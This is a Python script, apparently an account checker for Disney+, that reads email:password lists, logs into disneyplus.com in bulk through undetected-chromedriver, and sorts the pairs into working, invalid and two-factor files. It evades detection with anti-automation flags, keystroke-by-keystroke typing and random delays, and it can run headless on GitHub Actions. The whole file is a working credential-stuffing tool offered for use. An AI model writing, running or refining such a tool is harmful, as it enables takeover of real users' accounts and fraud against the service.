"""
DISNEY+ LOGIN TESTER - GITHUB ACTIONS OPTIMIZED
Uses undetected-chromedriver to bypass detection
"""

import time
import random
import os
import sys
import undetected_chromedriver as uc
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

class DisneyTester:
    def __init__(self):
        self.accounts_file = "my_disney_accounts.txt"
        self.working_file = "WORKING_ACCOUNTS.txt"
        self.invalid_file = "INVALID_ACCOUNTS.txt"
        self.twofa_file = "TWOFA_ACCOUNTS.txt"
        self.accounts = []
        self.working = []
        self.invalid = []
        self.twofa_accounts = []
        
        # GitHub Actions detection
        self.is_github = os.environ.get('GITHUB_ACTIONS') == 'true'
        
    def load_accounts(self):
        """Load accounts from file"""
        if not os.path.exists(self.accounts_file):
            print(f"❌ {self.accounts_file} not found!")
            return False
        
        with open(self.accounts_file, 'r') as f:
            for line in f:
                line = line.strip()
                if line and not line.startswith('#') and ':' in line:
                    email, password = line.split(':', 1)
                    self.accounts.append({
                        'email': email.strip(),
                        'password': password.strip()
                    })
        
        print(f"✅ Loaded {len(self.accounts)} accounts")
        return True
    
    def create_driver(self):
        """Create undetected Chrome driver"""
        options = uc.ChromeOptions()
        
        if self.is_github:
            print(f"   🕶️ GitHub Actions mode - setting up headless")
            options.add_argument('--headless=new')
            options.add_argument('--no-sandbox')
            options.add_argument('--disable-dev-shm-usage')
            options.add_argument('--disable-gpu')
            options.add_argument('--window-size=1920,1080')
            options.add_argument('--disable-blink-features=AutomationControlled')
        
        options.add_argument('--disable-blink-features=AutomationControlled')
        
        # Create undetected driver
        driver = uc.Chrome(options=options, headless=self.is_github, version_main=120)
        driver.set_page_load_timeout(60)
        return driver
    
    def test_login(self, account):
        """Test login with undetected Chrome"""
        email = account['email']
        password = account['password']
        
        print(f"\n🔍 Testing: {email[:30]}...")
        
        driver = None
        try:
            driver = self.create_driver()
            wait = WebDriverWait(driver, 30)
            
            # Go to Disney+ login
            print(f"   📄 Loading page...")
            driver.get("https://www.disneyplus.com/identity/login/enter-email")
            time.sleep(5)
            
            # Wait for email field
            print(f"   📧 Looking for email field...")
            email_input = wait.until(
                EC.presence_of_element_located((By.CSS_SELECTOR, "input[type='email']"))
            )
            
            # Type email
            email_input.clear()
            for char in email:
                email_input.send_keys(char)
                time.sleep(0.02)
            print(f"   📧 Email entered")
            time.sleep(2)
            
            # Click continue
            continue_btn = wait.until(
                EC.element_to_be_clickable((By.CSS_SELECTOR, "button[type='submit']"))
            )
            driver.execute_script("arguments[0].click();", continue_btn)
            print(f"   📤 Continue clicked")
            time.sleep(5)
            
            # Check for 2FA
            page_text = driver.page_source.lower()
            if 'verification' in page_text or 'enter the code' in page_text:
                print(f"   🔐 2FA REQUIRED - Skipping")
                self.twofa_accounts.append({'email': email, 'password': password})
                self.save_2fa()
                return None
            
            # Wait for password field
            print(f"   🔑 Looking for password field...")
            password_input = wait.until(
                EC.presence_of_element_located((By.CSS_SELECTOR, "input[type='password']"))
            )
            
            # Type password
            password_input.clear()
            for char in password:
                password_input.send_keys(char)
                time.sleep(0.02)
            print(f"   🔑 Password entered")
            time.sleep(2)
            
            # Click login
            login_btn = wait.until(
                EC.element_to_be_clickable((By.CSS_SELECTOR, "button[type='submit']"))
            )
            driver.execute_script("arguments[0].click();", login_btn)
            print(f"   📤 Login clicked")
            
            # Wait for result
            time.sleep(8)
            
            # Check result
            current_url = driver.current_url.lower()
            
            if 'home' in current_url or 'browse' in current_url or 'subscription' in current_url:
                print(f"   ✅✅✅ WORKING! ✅✅✅")
                self.working.append({'email': email, 'password': password})
                self.save_results()
                return True
            else:
                print(f"   ❌ INVALID")
                self.invalid.append({'email': email, 'password': password})
                self.save_results()
                return False
                    
        except Exception as e:
            print(f"   ❌ Error: {str(e)[:100]}")
            self.invalid.append({'email': email, 'password': password})
            self.save_results()
            return False
            
        finally:
            if driver:
                driver.quit()
                delay = random.uniform(20, 40)
                print(f"   ⏰ Waiting {delay:.0f} seconds...")
                time.sleep(delay)
    
    def save_results(self):
        """Save working and invalid accounts"""
        if self.working:
            with open(self.working_file, 'w') as f:
                for acc in self.working:
                    f.write(f"{acc['email']}:{acc['password']}\n")
            print(f"\n💾 Saved {len(self.working)} working accounts")
        
        if self.invalid:
            with open(self.invalid_file, 'w') as f:
                for acc in self.invalid:
                    f.write(f"{acc['email']}:{acc['password']}\n")
    
    def save_2fa(self):
        """Save 2FA accounts"""
        if self.twofa_accounts:
            with open(self.twofa_file, 'w') as f:
                for acc in self.twofa_accounts:
                    f.write(f"{acc['email']}:{acc['password']}\n")
            print(f"💾 Saved {len(self.twofa_accounts)} 2FA accounts")
    
    def check_all(self):
        """Check all accounts"""
        for i, account in enumerate(self.accounts, 1):
            print(f"\n{'='*50}")
            print(f"[{i}/{len(self.accounts)}]")
            print(f"{'='*50}")
            self.test_login(account)

def main():
    tester = DisneyTester()
    
    print("="*50)
    print("🎬 DISNEY+ LOGIN TESTER")
    print("="*50)
    
    if not tester.load_accounts():
        print("\n📝 Create my_disney_accounts.txt with:")
        print("   email:password")
        return
    
    print(f"\n📊 {len(tester.accounts)} accounts to test")
    
    if tester.is_github:
        print("🕶️ Running on GitHub Actions")
        start_time = time.time()
        tester.check_all()
        end_time = time.time()
        print(f"\n✅ Complete! Time: {(end_time - start_time) / 60:.1f} minutes")
        print(f"✅ Working: {len(tester.working)}")
        print(f"❌ Invalid: {len(tester.invalid)}")
        print(f"🔐 2FA: {len(tester.twofa_accounts)}")
    else:
        confirm = input("\n▶️ Start? (yes/no): ")
        if confirm.lower() == 'yes':
            tester.check_all()

if __name__ == "__main__":
    main()
